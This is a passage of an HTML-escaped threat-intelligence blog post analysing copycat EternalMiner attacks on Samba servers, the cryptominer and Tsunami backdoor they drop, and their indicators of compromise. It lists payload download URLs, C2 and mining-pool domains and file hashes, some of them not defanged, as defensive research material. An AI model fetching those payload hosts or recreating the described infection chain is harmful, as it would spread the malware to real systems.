+&lt;a href="#payload" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The payload (&lt;code&gt;http://update1.sdgndsfajfsdf[.]info/u1&lt;/code&gt;) is a short bash script
+which relays on system tools for 3 main tasks&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Setup daily updates from 3 different backup servers using crontab.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;http://update.sdgndsfajfsdf.info/upd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;http://update.sdgsafdsf.pw/upd2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;http://update.omfg.pw/upd3&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start="2"&gt;
+&lt;li&gt;Drop and execute Tsunami backdoor &amp;amp; CPUMiner in the background.&lt;/li&gt;
+&lt;li&gt;Prevent further exploitation by other players who might compete for
+resources(patch &lt;code&gt;smb.conf&lt;/code&gt;).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;We were also able to fetch the daily update script from a live server
+(&lt;code&gt;http://update.sdgndsfajfsdf.info/upd&lt;/code&gt;). It seems that this script is just a
+stripped version of the payload script, lacking the daily updates setup
+functionality:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/images/fig3.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;h3&gt;CPUMiner&lt;span class="hx:absolute hx:-mt-20" id="cpuminer"&gt;&lt;/span&gt;
+&lt;a href="#cpuminer" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;CPUMiner is an open source cryptomining command line utility supporting
+multiple coins/algorithms. It seems that the attackers used
+&amp;ldquo;&lt;a href="https://github.com/tpruvot/cpuminer-multi"target="_blank" rel="noopener"&gt;cpuminer-multi&lt;/a&gt;&amp;rdquo; – multithreaded
+more efficient version of the original @poolers cpuminer used by EternalMiner.
+This sample was &amp;ldquo;upgraded&amp;rdquo; it in a similar way as EternalMiner so it could run
+standalone without command line parameters. Once started, the upgraded cpuminer
+automatically login into the attackers private mining pool server
+(&lt;code&gt;p.theywant[.]in:8080&lt;/code&gt;), unlike the public mining pool server used by
+EternalMiner (&lt;code&gt;xmr.crypto-pool[.]fr:3333&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/images/fig4.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;h3&gt;Tsunami Backdoor&lt;span class="hx:absolute hx:-mt-20" id="tsunami-backdoor"&gt;&lt;/span&gt;
+&lt;a href="#tsunami-backdoor" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Alongside CPUMiner the payload script would also fetch &amp;amp; execute &amp;ldquo;Tsunami&amp;rdquo;
+(also known as Kaiten) which is an old Linux irc backdoor/ddos botnet best
+known for been used to infect
+&lt;a href="https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/"target="_blank" rel="noopener"&gt;IOT devices&lt;/a&gt;
+and
+&lt;a href="https://www.welivesecurity.com/2011/10/25/linux-tsunami-hits-os-x/"target="_blank" rel="noopener"&gt;OSX systems&lt;/a&gt;
+in the past. The source is
+&lt;a href="https://dl.packetstormsecurity.net/irc/kaiten.c"target="_blank" rel="noopener"&gt;publicly available&lt;/a&gt; and could
+be used by anyone. This sample
+(&lt;code&gt;d8e93252f41e8b0d10cffa92923eeab94c6c42e8acc308e91340df102042c8c8&lt;/code&gt;) is
+configured with hardcoded c2 irc server (&lt;code&gt;asdgsd.uselesslongdomain[.]info&lt;/code&gt;). We
+were able to connect to the live irc server using credentials hard coded in the
+malware. In the following picture you can see two victims currently logged in
+(running as root user).&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;h3&gt;Quickly adopting&lt;span class="hx:absolute hx:-mt-20" id="quickly-adopting"&gt;&lt;/span&gt;
+&lt;a href="#quickly-adopting" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We found that the domain used to host the payload file (&lt;code&gt;sdgndsfajfsdf[.]info&lt;/code&gt;)
+was registered on June 13th. Not only that but the first malicious
+CPUMiner/Tsunami samples were uploaded to VT a day after(June 14th), meaning
+that the attacks started within a short time of only 4-5 days after the
+original EternalMiner publication!&lt;/p&gt;
+&lt;h2&gt;Indicators of Compromise&lt;span class="hx:absolute hx:-mt-20" id="indicators-of-compromise"&gt;&lt;/span&gt;
+&lt;a href="#indicators-of-compromise" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Files&lt;span class="hx:absolute hx:-mt-20" id="files"&gt;&lt;/span&gt;
+&lt;a href="#files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;444d0fae73e1221b81dc6c5d53cf087afa88248fc22ef36e756841ab04df24a8 Dropper
+2b96805abdbd1d9ca03d584e48fcfb30740d051dfc93248ff3e21b3a831c0e1a Payload
+22a8dc0603005e3eee49706330c6a5b90214dcb0b3d2f89411fa10a6b3942e3b update file(daily)
+d8e93252f41e8b0d10cffa92923eeab94c6c42e8acc308e91340df102042c8c8 Tsunami
+162de4e95e5e5d35d80ca4cf752c80b2b32b52c9e5fef5551caa20b0d5ed83af Tsunami
+26a717a7a14f10880a2869949814400b31d1f4c9cc45384be38289b012587468 Cpuminer&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Network&lt;span class="hx:absolute hx:-mt-20" id="network"&gt;&lt;/span&gt;
+&lt;a href="#network" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;update1.sdgndsfajfsdf[.]info
+update.sdgndsfajfsdf.info
+update.sdgsafdsf.pw
+update.omfg.pw
+188.138.109.103
+asdgsd.uselesslongdomain.info
+p.theywant.in&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item></channel></rss>
